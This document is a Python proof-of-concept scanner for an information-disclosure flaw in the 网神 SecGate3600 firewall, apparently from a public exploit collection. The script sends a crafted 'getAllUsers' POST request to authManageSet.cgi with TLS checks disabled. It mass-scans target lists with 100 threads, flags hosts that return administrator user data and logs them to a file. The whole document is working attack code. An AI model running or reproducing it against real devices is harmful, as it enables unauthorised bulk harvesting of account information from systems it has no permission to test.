# 网神SecGate3600_authManageSet.cgi_信息泄露漏洞
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                                       author:MOYV                                                                                                                                    
    """
    print(test)

def poc(target):
    api_payload = "/cgi-bin/authUser/authManageSet.cgi"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/108.0.0.0Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip,deflate',
        'Connection': 'close',
    }
    data = "type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"

    try:
        res = requests.post(url=target + api_payload, headers=headers, data=data, verify=False, timeout=10)
        if res.status_code == 200 and '管理员' in res.text:
            print(f"[+]{target}存在信息泄露")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在信息泄露\n")
        else:
            print(f"[-]{target}不存在信息泄露")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parser = argparse.ArgumentParser(description='网神SecGate3600_authManageSet.cgi信息泄露漏洞脚本')
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()